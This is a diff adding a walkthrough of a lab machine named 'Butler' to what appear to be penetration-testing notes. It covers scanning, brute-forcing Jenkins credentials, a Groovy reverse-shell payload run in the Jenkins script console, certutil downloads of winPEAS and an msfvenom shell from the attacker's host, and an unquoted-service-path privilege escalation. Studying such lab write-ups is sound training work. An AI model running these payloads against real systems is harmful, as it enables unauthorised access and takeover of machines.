@@ -382,6 +382,178 @@ Running: Linux 4.X|5.X
 
 ## Butler
 
+* Recon:
+
+```shell
+netdiscover -r 10.0.2.0/24
+#gives IP of Butler 10.0.2.80
+
+nmap -T4 -p 1-10000 -A 10.0.2.80 #prevent slow scanning by defining range of ports
+```
+
+* Scan results:
+
+```shell
+135/tcp - open - msrpc - Microsoft Windows RPC
+139/tcp - open - netbios-ssn - Microsoft Windows netbios-ssn
+445/tcp -  open - microsoft-ds?
+5040/tcp - open - unknown
+7680/tcp - open - pando-pub?
+8080/tcp - open - http - Jetty 9.4.41.v20210516
+  http-server-header: Jetty(9.4.41.v20210516)
+  http-robots.txt: 1 disallowed entry 
+  http-title: Site does not have a title
+MAC Address: 08:00:27:A3:E0:75 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Microsoft Windows 10 1709 - 1909
+
+Host script results:
+  nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a3:e0:75 (Oracle VirtualBox virtual NIC)
+  smb2-time: 
+    date: 2022-03-04T09:29:43
+    start_date: N/A
+  smb2-security-mode: 
+    3.1.1: 
+    Message signing enabled but not required
+```
+
+* Enumerating HTTP on 8080:
+
+  * On visiting the link <http://10.0.2.80:8080>, we get a login page for Jenkins. The URL is now <http://10.0.2.80:8080/login?from=%2F> and it looks vulnerable.
+
+  * SQL injection does not work in the login page. We can attempt modifying the URL.
+
+  * Simultaneously, scanning website:
+
+    ```shell
+    nikto -h http://10.0.2.80:8080
+    
+    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.80:8080/FUZZ
+    ```
+
+  * These methods do not give any desirable outputs. We can attempt brute force login using Burp Suite.
+
+  * We can use Cluster Bomb attack in Burp Suite as we do not know username and password. Using common usernames and passwords, we begin the brute-force.
+
+  * Brute-force is successful as we get jenkins:jenkins as credentials for login.
+
+  * Information disclosure - Jetty(9.4.41.v20210516) and Jenkins 2.289.3 used.
+
+  * On searching for Jenkins exploits, we get a lot of results with Groovy being used. Furthermore, there is a part in the Jenkins website which uses Groovy in a script console, so we can search for vulnerabilities related to RCE (Remote Code Execution).
+
+  * Using Metasploit to attempt exploitation:
+
+    ```shell
+    msfconsole
+
+    use exploit/multi/http/jenkins_script_console
+
+    options
+
+    set RHOSTS 10.0.2.80
+
+    set RPORT 8484
+
+    set TARGETURI /
+
+    show targets
+
+    set target 0
+
+    options
+
+    exploit
+
+    #this did not work, so we will try another method
+    ```
+
+  * Exploiting through Jenkins script console:
+
+    ```shell
+    #in terminal
+    nc -nvlp 6666
+
+    #in the script console in Jenkins
+    String host="10.0.2.7";
+    int port=6666;
+    String cmd="cmd.exe";
+    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+    ```
+
+  * This works and we are able to gain access into the Butler machine:
+
+    ```shell
+    #currently in C:\Program Files\Jenkins
+    
+    whoami #butler\butler
+    #we have to use privilege escalation now, to get root access
+
+    systeminfo #gives complete info
+    #OS Name - Microsoft Windows 10 Enterprise Evaluation
+    #OS Build - 10.0.19043 N/A Build 19043
+    ```
+
+  * Similar to linPEAS for Linux Privilege Escalation, we have winPEAS for Windows Privilege Escalation, so we can attempt that. So, download winPEASx64.exe and open terminal in new tab:
+
+    ```shell
+    cd transfers/ #the folder from where we will be transferring folders to Butler
+
+    mv /root/Downloads/winPEASx64.exe /root/transfers/winpeas.exe
+
+    ls #we have winpeas.exe in this folder now
+
+    python3 -m http.server 80 #starting web server on port 80
+
+    #in Windows machine, that is, the terminal where we can access Butler
+    cd C:\Users
+
+    dir
+
+    cd butler #this folder will mostly have read/write access
+
+    certutil.exe -urlcache -f http://10.0.2.7/winpeas.exe winpeas.exe #using a service to transfer file from Kali Linux to Butler
+
+    dir #we have winpeas.exe now
+
+    winpeas.exe #executes and gives us a huge list of vulnerabilities
+    #we decide to choose the vulnerabilities which have detected 'No quotes and spaces' (in files such as 'Wise Care'), as those allow us to execute .exe files
+
+    #in the Kali machine, pause the webserver and insert malware to be transferred
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.7 LPORT=7777 -f exe > Wise.exe
+    #this generates a shell named Wise.exe
+
+    python3 -m http.server 80 #restart web server
+
+    #in a new tab, start listening on port 7777
+    nc -nvlp 7777
+    ```
+
+    ```shell
+    #in Butler
+    cd C:\
+
+    cd "Program Files (x86)"
+
+    dir
+
+    cd Wise #required directory
+
+    dir #includes 'Wise Care 365'
+
+    certutil.exe -urlcache -f http://10.0.2.7/Wise.exe Wise.exe
+    #as the 'Wise Care 365' service is started by admin, we have to first stop it and then run Wise.exe
+
+    sc stop WiseBootAssistant
+
+    sc query WiseBootAssistant #stops the service
+
+    sc start WiseBootAssistant #this gives us shell access
+
+    whoami #we have root access
+    ```
+
 ---
 
 ## Blackpearl
